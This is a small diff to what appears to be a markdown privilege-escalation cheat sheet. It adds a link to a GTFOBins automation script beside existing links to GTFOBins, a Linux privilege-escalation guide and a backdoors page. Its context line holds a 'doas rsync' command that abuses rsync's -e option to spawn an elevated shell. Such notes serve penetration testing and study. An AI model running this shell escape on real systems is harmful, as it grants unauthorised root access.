@@ -136,3 +136,4 @@ doas rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
 * [GTFOBins (unix)](https://gtfobins.github.io/)
 * [g0tmi1k priv esc linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 * [linux backdoors](./linux_backdoors.md)
+- [gtfo bins script](https://github.com/Frissi0n/GTFONow)
